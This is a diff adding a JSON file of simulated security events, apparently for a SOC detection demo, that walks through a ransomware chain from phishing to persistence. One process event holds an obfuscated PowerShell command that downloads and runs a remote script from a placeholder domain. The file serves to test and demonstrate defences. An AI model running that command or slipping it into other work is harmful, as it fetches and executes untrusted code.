@@ -1,0 +1,112 @@
+[
+  {
+    "name": "Full Agentic SOC Coverage Demo",
+    "delay": 0.05,
+    "events": [
+      {
+        "source": "incident",
+        "event_type": "security_incident",
+        "severity": "High",
+        "Title": "Multi-stage Ransomware Detection",
+        "Status": "Active",
+        "Owner": "SOC_Agent_01",
+        "Description": "Ransomware activity detected starting from a phishing email to C2 communication.",
+        "IncidentNumber": "8245"
+      },
+      {
+        "source": "mdo_email",
+        "event_type": "email_event",
+        "severity": "medium",
+        "Sender": "malicious@attacker.com",
+        "Recipient": "ceo@victim.com",
+        "Subject": "Urgent Invoice 8245",
+        "Action": "Delivered",
+        "mitre": {
+          "tactic": "Initial Access",
+          "technique_id": "T1566.001",
+          "technique_name": "Phishing: Spearphishing Attachment"
+        }
+      },
+      {
+        "event_type": "authentication",
+        "ResultType": "4625",
+        "UserPrincipalName": "root",
+        "ResultDescription": "Failed Login",
+        "source": "Azure AD",
+        "multiply": 50
+      },
+      {
+        "source": "alert",
+        "event_type": "security_alert",
+        "severity": "Medium",
+        "AlertName": "Suspicious PowerShell Execution",
+        "ProviderName": "Defender for Endpoint",
+        "Description": "PowerShell was used to download a suspicious file from a remote server.",
+        "Tactics": "Execution",
+        "Techniques": "T1059.001",
+        "mitre": {
+          "tactic": "Execution",
+          "technique_id": "T1059.001",
+          "technique_name": "Command and Scripting Interpreter: PowerShell"
+        }
+      },
+      {
+        "source": "endpoint_process",
+        "event_type": "process_creation",
+        "action": "ProcessCreated",
+        "FileName": "powershell.exe",
+        "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+        "ProcessCommandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8ve3tNQUxJQ0lPVVNfRE9NQUlOfX0vcGF5bG9hZC5wczEnKTs=",
+        "ProcessId": 8821,
+        "AccountName": "{{RANDOM_USER}}",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "InitiatingProcessFileName": "outlook.exe"
+      },
+      {
+        "source": "endpoint_file",
+        "event_type": "file_system",
+        "action": "FileCreated",
+        "FileName": "ransom_note.txt",
+        "FolderPath": "C:\\Users\\ceo\\Desktop",
+        "FileSize": 1024,
+        "SHA1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+        "AccountName": "ceo",
+        "DeviceName": "CEO-LAPTOP-01",
+        "mitre": {
+          "tactic": "Impact",
+          "technique_id": "T1486",
+          "technique_name": "Data Encrypted for Impact"
+        }
+      },
+      {
+        "source": "firewall",
+        "event_type": "network_connection",
+        "DeviceAction": "allowed",
+        "Protocol": "TCP",
+        "IPAddress": "10.0.0.5",
+        "SourcePort": 49152,
+        "DestinationIP": "91.228.167.21",
+        "DestinationPort": 443,
+        "mitre": {
+          "tactic": "Command and Control",
+          "technique_id": "T1071.001",
+          "technique_name": "Application Layer Protocol: Web Protocols"
+        }
+      },
+      {
+        "source": "endpoint_registry",
+        "event_type": "registry",
+        "action": "RegistryValueSet",
+        "RegistryKey": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "RegistryValueName": "WindowsDefenderUpdate",
+        "RegistryValueData": "C:\\Users\\ceo\\AppData\\Local\\Temp\\malicious.exe",
+        "DeviceName": "CEO-LAPTOP-01",
+        "mitre": {
+          "tactic": "Persistence",
+          "technique_id": "T1547.001",
+          "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+        }
+      }
+    ]
+  }
+]
